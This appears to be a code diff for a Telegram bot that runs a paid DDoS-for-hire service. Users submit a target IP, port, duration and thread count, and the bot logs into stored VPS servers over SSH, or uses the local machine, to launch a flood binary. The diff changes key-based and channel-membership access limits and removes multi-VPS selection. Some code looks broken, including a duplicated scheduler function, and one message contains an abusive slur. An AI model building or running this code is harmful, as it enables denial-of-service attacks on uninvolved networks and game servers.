@@ -8,6 +8,9 @@ import json
 import shutil
 import uuid
 import telegram
+from apscheduler.schedulers.asyncio import AsyncIOScheduler
+from apscheduler.jobstores.memory import MemoryJobStore
+from apscheduler.triggers.interval import IntervalTrigger
 from collections import defaultdict
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
@@ -55,6 +58,10 @@ BOT_START_TIME = time.time()
 GROUP_DISPLAY_NAMES = {}  # Key: group_id, Value: display_name
 DISPLAY_NAME_FILE = "display_names.json"
 
+# Add this with other global variables
+job_scheduler = AsyncIOScheduler(jobstores={'default': MemoryJobStore()})
+BOT_JOBS = {}  # Key: bot token, Value: list of job IDs
+
 # Logging Configuration
 LOG_FILE = "button_logs.json"
 LOG_DATA = defaultdict(list)
@@ -67,8 +74,7 @@ DISPLAY_NAME_FILE = "display_names.json"
 
 # Force Join Configuration
 FORCE_JOIN_ENABLED = False
-FORCE_JOIN_CHANNELS = {}  # Key: group_id, Value: channel_username
-DEFAULT_FORCE_CHANNEL = "@lalanub120"  # Default channel if none set for group
+FORCE_JOIN_CHANNEL = "@lalanub120"  # Change this to your channel
 
 # VPS Configuration
 VPS_FILE = "vps.txt"
@@ -162,7 +168,7 @@ vps_settings_keyboard = [
         ['Add VPS', 'Remove VPS'],
         ['VPS Status', 'Upload Binary'],
         ['Delete Binary', 'Reset VPS'],
-        ['Select VPS', 'Back to Owner']
+        ['Set VPS', 'Back to Owner']
     ]
 vps_settings_markup = ReplyKeyboardMarkup(vps_settings_keyboard, resize_keyboard=True)
 
@@ -260,60 +266,49 @@ GET_LINK_URL = 31
 GET_BROADCAST_MESSAGE = 31
 GET_CHANNEL_NAME = 32  # Add this with the other state constants
 GET_FORCE_CHANNEL = 33  # Add this with the other state constants
-SELECT_VPS = 34
 
+def start_job_scheduler(loop=None):
+    """Start the job scheduler if not already running"""
+    if not job_scheduler.running:
+        if loop is None:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+        job_scheduler.start()
+        logging.info("Job scheduler started")
 
-async def select_vps_start(update: Update, context: CallbackContext):
-    # Only allow owner in private chat
-    if update.effective_chat.type != 'private' or not is_owner(update):
-        await update.message.reply_text("❌ *Only owner can select VPS in private chat!*", parse_mode='Markdown')
-        return ConversationHandler.END
-
-    if not VPS_LIST:
-        await update.message.reply_text("❌ No VPS configured!", parse_mode='Markdown')
-        return ConversationHandler.END
-
-    # Create a list of VPS with numbers
-    vps_list = "\n".join(
-        f"{i+1}. IP: `{vps[0]}`" 
-        for i, vps in enumerate(VPS_LIST)
-    )
-    await update.message.reply_text(
-        f"⚠️ Select VPS for attack (comma separated numbers, e.g. 1,2,3):\n\n{vps_list}\n\n"
-        f"Max {len(VPS_LIST)} VPS can be selected.",
-        parse_mode='Markdown'
-    )
-    return SELECT_VPS
-
-async def select_vps_input(update: Update, context: CallbackContext):
-    try:
-        selected_numbers = [int(num.strip()) for num in update.message.text.split(',')]
-        selected_vps = []
+# Add these functions to manage jobs
+def start_job_scheduler():
+    """Start the job scheduler if not already running"""
+    if not job_scheduler.running:
+        try:
+            # Try to get the running loop first
+            loop = asyncio.get_running_loop()
+        except RuntimeError:
+            # If no running loop, create a new one
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
         
-        for num in selected_numbers:
-            if 1 <= num <= len(VPS_LIST):
-                selected_vps.append(VPS_LIST[num-1][0])  # Store just the IP
-            else:
-                raise ValueError("Invalid VPS number")
-                
-        if not selected_vps:
-            raise ValueError("No valid VPS selected")
-            
-        context.user_data['selected_vps'] = selected_vps
-        await update.message.reply_text(
-            f"✅ Selected VPS: {', '.join(selected_vps)}\n\n"
-            f"Now use the Attack button to launch attacks on these VPS.",
-            parse_mode='Markdown'
-        )
-        return ConversationHandler.END
-        
-    except ValueError as e:
-        await update.message.reply_text(
-            f"❌ Invalid selection: {str(e)}\n\n"
-            f"Please enter comma separated numbers (e.g. 1,2,3)",
-            parse_mode='Markdown'
-        )
-        return SELECT_VPS
+        job_scheduler.start()
+        logging.info("Job scheduler started")
+
+def add_bot_job(bot_token: str, job_func, *args, **kwargs):
+    """Add a job for a specific bot instance"""
+    if bot_token not in BOT_JOBS:
+        BOT_JOBS[bot_token] = []
+    
+    job = job_scheduler.add_job(job_func, *args, **kwargs)
+    BOT_JOBS[bot_token].append(job.id)
+    return job
+
+def remove_bot_jobs(bot_token: str):
+    """Remove all jobs for a specific bot instance"""
+    if bot_token in BOT_JOBS:
+        for job_id in BOT_JOBS[bot_token]:
+            try:
+                job_scheduler.remove_job(job_id)
+            except:
+                pass
+        del BOT_JOBS[bot_token]
 
 
 async def function_menu(update: Update, context: CallbackContext):
@@ -382,107 +377,29 @@ async def change_force_channel_start(update: Update, context: CallbackContext):
         return ConversationHandler.END
     
     await update.message.reply_text(
-        "⚠️ First, enter the group ID you want to set the force channel for (or 'default' for default channel):",
-        parse_mode='Markdown'
-    )
-    return GET_GROUP_FOR_DISPLAY_NAME
-
-async def get_group_for_force_channel(update: Update, context: CallbackContext):
-    """Get the group ID to set force channel for"""
-    group_input = update.message.text.strip()
-    
-    if group_input.lower() == 'default':
-        context.user_data['force_channel_group'] = 'default'
-    else:
-        try:
-            group_id = int(group_input)
-            context.user_data['force_channel_group'] = group_id
-        except ValueError:
-            await update.message.reply_text("❌ Invalid group ID! Please enter a numeric ID or 'default'", parse_mode='Markdown')
-            return ConversationHandler.END
-    
-    await update.message.reply_text(
-        "⚠️ Now enter the new channel username (e.g., @newchannel):",
+        "⚠️ Enter the new channel username (e.g., @newchannel):",
         parse_mode='Markdown'
     )
     return GET_FORCE_CHANNEL
 
 async def change_force_channel_input(update: Update, context: CallbackContext):
     """Update the force join channel"""
+    global FORCE_JOIN_CHANNEL
     new_channel = update.message.text.strip()
-    group_id = context.user_data.get('force_channel_group', 'default')
     
     # Basic validation
     if not new_channel.startswith('@'):
         await update.message.reply_text("❌ Channel must start with @", parse_mode='Markdown')
         return ConversationHandler.END
     
-    if group_id == 'default':
-        DEFAULT_FORCE_CHANNEL = new_channel
-    else:
-        FORCE_JOIN_CHANNELS[group_id] = new_channel
+    FORCE_JOIN_CHANNEL = new_channel
     
     await update.message.reply_text(
-        f"✅ Force join channel updated to: {new_channel} for {'default' if group_id == 'default' else f'group {group_id}'}",
+        f"✅ Force join channel updated to: {new_channel}",
         parse_mode='Markdown'
     )
     return ConversationHandler.END
 
-
-async def check_channel_membership(user_id: int, context: CallbackContext, group_id=None) -> bool:
-    """Check if a user is a member of the specified channel with robust error handling."""
-    if not isinstance(user_id, int) or user_id <= 0:
-        logging.error(f"Invalid user_id {user_id} when checking channel membership")
-        return False
-    
-    # Get the appropriate channel for this group
-    channel = FORCE_JOIN_CHANNELS.get(group_id, DEFAULT_FORCE_CHANNEL)
-    
-    # Convert channel to string if it's not already
-    channel = str(channel)
-    
-    # If we got a numeric ID (like -100123456789), convert to string
-    if isinstance(channel, (int, float)):
-        channel = str(int(channel))
-    
-    if not (channel.startswith('@') or channel.startswith('-100')):
-        logging.error(f"Invalid channel format: {channel}")
-        return False
-
-    try:
-        # First verify the user exists
-        try:
-            user = await context.bot.get_chat(user_id)
-            if not user:
-                logging.error(f"User {user_id} not found")
-                return False
-        except Exception as e:
-            logging.error(f"Error verifying user {user_id}: {str(e)}")
-            return False
-
-        # Now check channel membership
-        try:
-            chat_member = await context.bot.get_chat_member(
-                chat_id=channel,
-                user_id=user_id
-            )
-            return chat_member.status not in ['left', 'kicked']
-        except telegram.error.BadRequest as e:
-            if "user not found" in str(e).lower():
-                logging.error(f"User {user_id} not found when checking channel membership")
-            elif "chat not found" in str(e).lower():
-                logging.error(f"Channel {channel} not found")
-            else:
-                logging.error(f"BadRequest when checking channel membership: {e}")
-            return False
-        except Exception as e:
-            logging.error(f"Unexpected error checking channel membership: {e}")
-            return False
-
-    except Exception as e:
-        logging.error(f"General error in check_channel_membership: {e}")
-        return False
-    
 def log_button_click(user_id: int, username: str, button_name: str, chat_type: str, group_id: int = None):
     """Log button clicks to a JSON file"""
     log_entry = {
@@ -536,11 +453,18 @@ async def view_logs(update: Update, context: CallbackContext):
         await update.message.reply_text("Error loading logs.", parse_mode='Markdown')
 
 async def force_join_on(update: Update, context: CallbackContext):
+    """Enable force join requirement"""
+    if not (is_owner(update) or is_co_owner(update)):
+        await update.message.reply_text("❌ Only owner or co-owners can enable force join!", parse_mode='Markdown')
+        return
+    
     global FORCE_JOIN_ENABLED
     FORCE_JOIN_ENABLED = True
-    channel = FORCE_JOIN_CHANNELS.get(update.effective_chat.id, DEFAULT_FORCE_CHANNEL)
+    
     await update.message.reply_text(
-        f"✅ *Force Join enabled! Users must join {channel} before attacking.*",
+        f"✅ Force Join enabled!\n\n"
+        f"Users must join {FORCE_JOIN_CHANNEL} before attacking.\n"
+        f"Key holders can still attack without joining.",
         parse_mode='Markdown'
     )
 
@@ -566,18 +490,9 @@ async def check_channel_membership(user_id: int, context: CallbackContext, chann
         logging.error(f"Invalid user_id {user_id} when checking channel membership")
         return False
     
-    # Convert channel to string if it's not already
-    channel = str(channel)
-    
-    # If we got a numeric ID (like -100123456789), ensure it's a string
-    if not (channel.startswith('@') or channel.startswith('-100')):
-        # If it's a plain number, convert to -100 format
-        try:
-            channel_id = int(channel)
-            channel = f"-100{abs(channel_id)}"
-        except ValueError:
-            logging.error(f"Invalid channel format: {channel}")
-            return False
+    if not channel.startswith('@') and not channel.startswith('-100'):
+        logging.error(f"Invalid channel format: {channel}")
+        return False
 
     try:
         # First verify the user exists
@@ -612,6 +527,8 @@ async def check_channel_membership(user_id: int, context: CallbackContext, chann
     except Exception as e:
         logging.error(f"General error in check_channel_membership: {e}")
         return False
+
+
 
 
 
@@ -1105,7 +1022,7 @@ async def reset_vps(update: Update, context: CallbackContext):
     )
 
 async def add_bot_instance(update: Update, context: CallbackContext):
-    """Add a new bot instance"""
+    """Add a new bot instance with associated jobs"""
     if not is_owner(update):
         await update.message.reply_text("❌ Only owner can add bot instances!", parse_mode='Markdown')
         return ConversationHandler.END
@@ -1285,7 +1202,7 @@ async def delete_binary_confirm(update: Update, context: CallbackContext):
     return ConversationHandler.END
 
 async def add_owner_username(update: Update, context: CallbackContext):
-    """Get owner username and start new bot instance"""
+    """Get owner username and start new bot instance with jobs"""
     owner_username = update.message.text.strip()
     token = context.user_data['new_bot_token']
     
@@ -1304,7 +1221,8 @@ async def add_owner_username(update: Update, context: CallbackContext):
     new_config = {
         'token': token,
         'owner_username': owner_username,
-        'active': False
+        'active': False,
+        'jobs': []  # Track jobs for this instance
     }
     configs.append(new_config)
     save_bot_configs(configs)
@@ -1318,6 +1236,12 @@ async def add_owner_username(update: Update, context: CallbackContext):
     
     BOT_INSTANCES[token] = process
     new_config['active'] = True
+    
+    # Add jobs for this bot instance
+    job1 = add_bot_job(token, check_expired_keys, trigger=IntervalTrigger(hours=1))
+    job2 = add_bot_job(token, send_logs_to_owner, trigger=IntervalTrigger(days=1))
+    
+    new_config['jobs'] = [job1.id, job2.id]
     save_bot_configs(configs)
     
     # Update the display name for this bot instance
@@ -1325,16 +1249,12 @@ async def add_owner_username(update: Update, context: CallbackContext):
     with open(DISPLAY_NAME_FILE, 'w') as f:
         json.dump(GROUP_DISPLAY_NAMES, f)
     
-    # Escape Markdown characters in the token and username
-    display_token = escape_markdown(token[:10] + "...", version=2)
-    display_username = escape_markdown(owner_username, version=2)
-    
     await update.message.reply_text(
-        f"✅ New bot instance added and started\!\n\n"
-        f"Token: `{display_token}`\n"
-        f"Owner: @{display_username}\n\n"
-        f"Use `/stopbot_{len(configs)-1}` to stop this instance\.",
-        parse_mode='MarkdownV2'
+        f"✅ New bot instance added and started with 2 background jobs!\n\n"
+        f"Token: `{token[:10]}...`\n"
+        f"Owner: @{owner_username}\n\n"
+        f"Use `/stopbot_{len(configs)-1}` to stop this instance.",
+        parse_mode='Markdown'
     )
     return ConversationHandler.END
 
@@ -1379,16 +1299,18 @@ async def remove_bot_selection(update: Update, context: CallbackContext):
                     process.kill()
                 del BOT_INSTANCES[config['token']]
             
+            # Remove all jobs for this bot
+            remove_bot_jobs(config['token'])
+            
             # Remove data directory
             try:
                 if os.path.exists(config['data_dir']):
-                    import shutil
                     shutil.rmtree(config['data_dir'])
             except Exception as e:
                 logging.error(f"Error removing bot data directory: {e}")
             
             await update.message.reply_text(
-                f"✅ Bot instance {selection} removed successfully!",
+                f"✅ Bot instance {selection} removed successfully with all jobs!",
                 parse_mode='Markdown'
             )
         else:
@@ -1550,7 +1472,7 @@ async def open_bot(update: Update, context: CallbackContext):
     bot_open = True
     await update.message.reply_text(
         "✅ *Bot opened! Users can now attack for 120 seconds without keys.*\n"
-        "⚠️ *Note:* This is temporary access only - users still need to join the channel if force join is enabled.",
+        f"🔑 *For 200 seconds attacks, keys are still required. Buy from *",
         parse_mode='Markdown'
     )
 
@@ -1562,8 +1484,7 @@ async def close_bot(update: Update, context: CallbackContext):
     global bot_open
     bot_open = False
     await update.message.reply_text(
-        "✅ *Bot closed! Users now need keys for all attacks.*\n"
-        "⚠️ *Note:* Channel members can still attack if force join is enabled.",
+        "✅ *Bot closed! Users now need keys for all attacks.*\n",
         parse_mode='Markdown'
     )
 
@@ -1832,53 +1753,30 @@ async def attack_start(update: Update, context: CallbackContext):
         )
         return ConversationHandler.END
 
-    # Get the force channel for this group
-    channel = FORCE_JOIN_CHANNELS.get(chat.id, DEFAULT_FORCE_CHANNEL) if chat.type in ['group', 'supergroup'] else DEFAULT_FORCE_CHANNEL
-    
     # Check if user has a valid key
     user_has_key = user_id in redeemed_users and (
         (isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id]['expiration_time'] > time.time()) or
         (isinstance(redeemed_users[user_id], (int, float)) and redeemed_users[user_id] > time.time())
     )
     
-    # Check access conditions - BOT OPEN CHECK SHOULD COME FIRST
+    # Check if bot is open (no key needed)
     user_has_access = False
-    
-    # 1. If bot is open, allow access for 120 seconds
     if bot_open:
         user_has_access = True
-        max_allowed_duration = 120  # 2 minutes when bot is open
-        max_allowed_threads = 1000
-    # 2. If user has a valid key, allow access
     elif user_has_key:
         user_has_access = True
-        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
-            max_allowed_duration = SPECIAL_MAX_DURATION
-            max_allowed_threads = SPECIAL_MAX_THREADS
-        else:
-            max_allowed_duration = max_duration
-            max_allowed_threads = MAX_THREADS
-    # 3. If force join is enabled, check channel membership
     elif FORCE_JOIN_ENABLED:
-        try:
-            is_member = await check_channel_membership(user_id, context, channel)
-            if is_member:
-                user_has_access = True
-                max_allowed_duration = 120  # 2 minutes for channel members
-                max_allowed_threads = 1000
-        except Exception as e:
-            logging.error(f"Error checking channel membership: {e}")
+        # Only check channel membership if force join is enabled
+        is_member = await check_channel_membership(user_id, context, FORCE_JOIN_CHANNEL)
+        if is_member:
+            user_has_access = True
 
     if user_has_access:
-        context.user_data['max_allowed_duration'] = max_allowed_duration
-        context.user_data['max_allowed_threads'] = max_allowed_threads
-        
         current_display_name = get_display_name(update.effective_chat.id)
         
         await update.message.reply_text(
             "⚠️ *Enter the attack arguments: <ip> <port> <duration> <threads>*\n\n"
-            f"ℹ️ *Max duration: {max_allowed_duration} sec*\n"
-            f"ℹ️ *Max threads: {max_allowed_threads}*\n\n"
+            f"ℹ️ *Max duration: {max_duration} sec for channel members, {SPECIAL_MAX_DURATION} sec for key holders.*\n\n"
             f"🔑 *Buy keys from {current_display_name} for extended features*",
             parse_mode='Markdown'
         )
@@ -1888,7 +1786,7 @@ async def attack_start(update: Update, context: CallbackContext):
         
         if FORCE_JOIN_ENABLED:
             await update.message.reply_text(
-                f"❌ *You must join {channel} to attack!*\n\n"
+                f"❌ *You must join {FORCE_JOIN_CHANNEL} to attack!*\n\n"
                 f"🔑 *Or buy a key from {current_display_name} for uninterrupted access*",
                 parse_mode='Markdown'
             )
@@ -1902,9 +1800,6 @@ async def attack_start(update: Update, context: CallbackContext):
 
 async def attack_input(update: Update, context: CallbackContext):
     global last_attack_time, running_attacks
-    
-    # Get user_id from the update
-    user_id = update.effective_user.id
 
     args = update.message.text.split()
     if len(args) != 4:
@@ -1918,18 +1813,34 @@ async def attack_input(update: Update, context: CallbackContext):
         )
         return ConversationHandler.END
 
-    ip, port, duration_str, threads_str = args
-    
-    try:
-        duration = int(duration_str)
-        threads = int(threads_str)
-    except ValueError:
-        await update.message.reply_text("❌ *Invalid duration or threads! Please enter numbers.*", parse_mode='Markdown')
-        return ConversationHandler.END
+    ip, port, duration, threads = args
+    duration = int(duration)
+    threads = int(threads)
 
-    # Get max allowed values from context
-    max_allowed_duration = context.user_data.get('max_allowed_duration', 120)
-    max_allowed_threads = context.user_data.get('max_allowed_threads', 1000)
+    user_id = update.effective_user.id
+    
+    # Check user's permissions
+    is_member = await check_channel_membership(user_id, context, FORCE_JOIN_CHANNEL)
+    is_special = False
+    
+    if user_id in redeemed_users:
+        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
+            is_special = True
+            max_allowed_duration = SPECIAL_MAX_DURATION
+            max_allowed_threads = SPECIAL_MAX_THREADS
+        elif isinstance(redeemed_users[user_id], (int, float)) and redeemed_users[user_id] > time.time():
+            max_allowed_duration = max_duration  # Regular key holders get standard limits
+            max_allowed_threads = MAX_THREADS
+    elif is_member:
+        # Channel members get basic access
+        max_allowed_duration = 120  # 2 minutes for channel members
+        max_allowed_threads = 1000
+    else:
+        await update.message.reply_text(
+            "❌ *Access denied! Join the channel or get a key.*",
+            parse_mode='Markdown'
+        )
+        return ConversationHandler.END
 
     if duration > max_allowed_duration:
         current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
@@ -1951,148 +1862,109 @@ async def attack_input(update: Update, context: CallbackContext):
         )
         return ConversationHandler.END
 
-    # Check if user has special key privileges
-    is_special = False
-    if user_id in redeemed_users:
-        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
-            is_special = True
-
-    # Get selected VPS or use random if none selected
-    selected_vps_ips = context.user_data.get('selected_vps', [random.choice([vps[0] for vps in VPS_LIST])])
-    
-    # Clear selection after use
-    if 'selected_vps' in context.user_data:
-        del context.user_data['selected_vps']
-    
+    # Rest of the attack logic remains the same...
     last_attack_time = time.time()
     
-    # Store all attack IDs
-    attack_ids = []
-    for vps_ip in selected_vps_ips:
-        attack_id = f"{ip}:{port}-{time.time()}-{vps_ip}"
-        running_attacks[attack_id] = {
-            'user_id': user_id,
-            'start_time': time.time(),
-            'duration': duration,
-            'is_special': is_special,
-            'vps_ip': vps_ip
-        }
-        attack_ids.append(attack_id)
+    # Select a random available VPS
+    selected_vps_ip = random.choice([vps[0] for vps in VPS_LIST]) if VPS_LIST else "localhost"
+    
+    attack_id = f"{ip}:{port}-{time.time()}"
+    running_attacks[attack_id] = {
+        'user_id': user_id,
+        'start_time': time.time(),
+        'duration': duration,
+        'is_special': is_special,
+        'vps_ip': selected_vps_ip
+    }
 
     attack_type = "⚡ *SPECIAL ATTACK* ⚡" if is_special else "⚔️ *Attack Started!*"
     
     current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
     
-    # Send single attack start message showing all VPS
-    attack_msg = await update.message.reply_text(
+    await update.message.reply_text(
         f"{attack_type}\n"
         f"🎯 *Target*: {ip}:{port}\n"
         f"🕒 *Duration*: {duration} sec\n"
         f"🧵 *Threads*: {threads}\n"
-        f"🌐 *VPS Used*: {', '.join(selected_vps_ips)}\n"
+        f"🌐 *VPS Used*: `{selected_vps_ip}`\n"
         f"👑 *Bot Owner:* {current_display_name}\n\n"
-        f"🔥 *Attack launched successfully on {len(selected_vps_ips)} VPS!*",
+        f"🔥 *Attack launched successfully!*",
         parse_mode='Markdown'
     )
 
-    # Store message ID for later editing
-    context.user_data['attack_msg_id'] = attack_msg.message_id
+    # Rest of the attack execution code...
 
-    # Launch attacks on all selected VPS - pass context as argument
-    for attack_id in attack_ids:
-        vps_ip = attack_id.split('-')[-1]
-        asyncio.create_task(run_attack(ip, port, duration, threads, vps_ip, attack_id, update, context))
+    async def run_attack():
+        try:
+            # Find the selected VPS details
+            selected_vps = None
+            for vps in VPS_LIST:
+                if vps[0] == selected_vps_ip:
+                    selected_vps = vps
+                    break
+            
+            if selected_vps:
+                try:
+                    # Execute attack on remote VPS using bgmi binary
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    ssh.connect(selected_vps[0], username=selected_vps[1], password=selected_vps[2], timeout=10)
+                    
+                    command = f"{BINARY_PATH} {ip} {port} {duration} {threads}"
+                    stdin, stdout, stderr = ssh.exec_command(command)
+                    
+                    # Wait for command to complete or timeout
+                    start_time = time.time()
+                    while time.time() - start_time < duration + 10:  # Add buffer time
+                        if stdout.channel.exit_status_ready():
+                            break
+                        await asyncio.sleep(1)
+                    
+                    ssh.close()
+                except Exception as e:
+                    logging.error(f"Error executing attack on VPS {selected_vps[0]}: {str(e)}")
+                    raise
+            else:
+                # Fallback to local execution if no VPS
+                process = await asyncio.create_subprocess_shell(
+                    f"{BINARY_PATH} {ip} {port} {duration} {threads}",
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE
+                )
+                await process.communicate()
 
-    return ConversationHandler.END
+            if attack_id in running_attacks:
+                del running_attacks[attack_id]
 
-async def run_attack(ip, port, duration, threads, vps_ip, attack_id, update: Update, context: CallbackContext):
-    try:
-        # Find the selected VPS details
-        selected_vps = None
-        for vps in VPS_LIST:
-            if vps[0] == vps_ip:
-                selected_vps = vps
-                break
-        
-        if selected_vps:
-            try:
-                # Execute attack on remote VPS using bgmi binary
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(selected_vps[0], username=selected_vps[1], password=selected_vps[2], timeout=10)
-                
-                command = f"{BINARY_PATH} {ip} {port} {duration} {threads}"
-                stdin, stdout, stderr = ssh.exec_command(command)
-                
-                # Wait for command to complete or timeout
-                start_time = time.time()
-                while time.time() - start_time < duration + 10:  # Add buffer time
-                    if stdout.channel.exit_status_ready():
-                        break
-                    await asyncio.sleep(1)
-                
-                ssh.close()
-            except Exception as e:
-                logging.error(f"Error executing attack on VPS {selected_vps[0]}: {str(e)}")
-                raise
-        else:
-            # Fallback to local execution if no VPS
-            process = await asyncio.create_subprocess_shell(
-                f"{BINARY_PATH} {ip} {port} {duration} {threads}",
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            await process.communicate()
-
-        if attack_id in running_attacks:
-            del running_attacks[attack_id]
-
-        # Check if all attacks are finished
-        if not running_attacks:
             current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
             
-            # Edit original attack message to show completion
-            try:
-                await context.bot.edit_message_text(
-                    chat_id=update.effective_chat.id,
-                    message_id=context.user_data['attack_msg_id'],
-                    text=f"✅ *Attack Finished!*\n"
-                        f"🎯 *Target*: {ip}:{port}\n"
-                        f"🕒 *Duration*: {duration} sec\n"
-                        f"🧵 *Threads*: {threads}\n"
-                        f"👑 *Bot Owner:* {current_display_name}\n\n"
-                        f"🔥 *Attack completed successfully on all VPS!*",
-                    parse_mode='Markdown'
-                )
-            except Exception as e:
-                logging.error(f"Error editing message: {e}")
-                # If message can't be edited, send new one
-                await update.message.reply_text(
-                    f"✅ *Attack Finished!*\n"
-                    f"🎯 *Target*: {ip}:{port}\n"
-                    f"🕒 *Duration*: {duration} sec\n"
-                    f"🧵 *Threads*: {threads}\n"
-                    f"👑 *Bot Owner:* {current_display_name}\n\n"
-                    f"🔥 *Attack completed successfully on all VPS!*",
-                    parse_mode='Markdown'
-                )
+            await update.message.reply_text(
+                f"✅ *Attack Finished!*\n"
+                f"🎯 *Target*: {ip}:{port}\n"
+                f"🕒 *Duration*: {duration} sec\n"
+                f"🧵 *Threads*: {threads}\n"
+                f"🌐 *VPS Used*: `{selected_vps_ip}`\n"
+                f"👑 *Bot Owner:* {current_display_name}\n\n"
+                f"🔥 *RITIK KI MUMMY CHODNA AB BND HO GY HA.*",
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            logging.error(f"Error in attack execution: {str(e)}")
+            if attack_id in running_attacks:
+                del running_attacks[attack_id]
             
-    except Exception as e:
-        logging.error(f"Error in attack execution on {vps_ip}: {str(e)}")
-        if attack_id in running_attacks:
-            del running_attacks[attack_id]
-        
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
-        
-        await update.message.reply_text(
-            f"❌ *Attack Failed on {vps_ip}!*\n"
-            f"🎯 *Target*: {ip}:{port}\n"
-            f"🌐 *VPS Used*: `{vps_ip}`\n"
-            f"👑 *Bot Owner:* {current_display_name}\n\n"
-            f"💥 *Error*: {str(e)}",
-            parse_mode='Markdown'
-        )
-    asyncio.create_task(run_attack(ip, port, duration, threads, vps_ip, attack_id, update))
+            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            
+            await update.message.reply_text(
+                f"❌ *Attack Failed!*\n"
+                f"🎯 *Target*: {ip}:{port}\n"
+                f"🌐 *VPS Used*: `{selected_vps_ip}`\n"
+                f"👑 *Bot Owner:* {current_display_name}\n\n"
+                f"💥 *Error*: {str(e)}",
+                parse_mode='Markdown'
+            )
+
+    asyncio.create_task(run_attack())
     return ConversationHandler.END
 
 async def set_cooldown_start(update: Update, context: CallbackContext):
@@ -3361,11 +3233,16 @@ def main():
     # Declare globals first
     global TELEGRAM_BOT_TOKEN, OWNER_USERNAME
     
+    # Create event loop
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
     # Load configurations
     load_keys()
     load_vps()
     load_display_name()
     load_links()  # Add this line
+    start_job_scheduler()
 
     # Create the Application
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
@@ -3507,14 +3384,6 @@ def main():
         },
         fallbacks=[CommandHandler("cancel", cancel_conversation)],
     )
-    
-    select_vps_handler = ConversationHandler(
-    entry_points=[MessageHandler(filters.Text("Select VPS"), select_vps_start)],
-    states={
-        SELECT_VPS: [MessageHandler(filters.TEXT & ~filters.COMMAND, select_vps_input)],
-    },
-    fallbacks=[CommandHandler("cancel", cancel_conversation)],
-    )
 
     # Add co-owner handlers
     add_co_owner_handler = ConversationHandler(
@@ -3563,10 +3432,9 @@ def main():
     change_force_channel_handler = ConversationHandler(
         entry_points=[MessageHandler(filters.Text("Change Force Channel"), change_force_channel_start)],
         states={
-            GET_GROUP_FOR_DISPLAY_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_group_for_force_channel)],
             GET_FORCE_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_force_channel_input)],
         },
-        fallbacks=[CommandHandler("cancel", cancel_conversation)],
+    fallbacks=[CommandHandler("cancel", cancel_conversation)],
     )
 
     remove_group_id_handler = ConversationHandler(
@@ -3733,7 +3601,6 @@ def main():
     application.add_handler(broadcast_handler)
     application.add_handler(stop_bot_handler)
     application.add_handler(delete_binary_handler)
-    application.add_handler(select_vps_handler)
     application.add_handler(function_menu_handler)
     application.add_handler(MessageHandler(filters.Text("Back to Owner"), back_to_owner))
     application.add_handler(MessageHandler(filters.Text("Service Menu"), service_menu))
@@ -3752,13 +3619,13 @@ def main():
     application.add_handler(MessageHandler(filters.ALL & (filters.ChatType.GROUP | filters.ChatType.SUPERGROUP), track_new_chat))
     application.add_handler(MessageHandler(filters.Text("🔗 Manage Links"), manage_links))
     application.add_handler(ChatMemberHandler(track_left_chat, ChatMemberHandler.MY_CHAT_MEMBER))
-
-    # Add job queue to check expired keys
+    # Code that may raise an exception or needs cleanup
     job_queue = application.job_queue
-    job_queue.run_repeating(check_expired_keys, interval=3600, first=10)  # Check every hour
+    job_queue.run_repeating(check_expired_keys, interval=3600, first=10)
     application.run_polling()
+
+    
 
 if __name__ == '__main__':
     main()
-
 
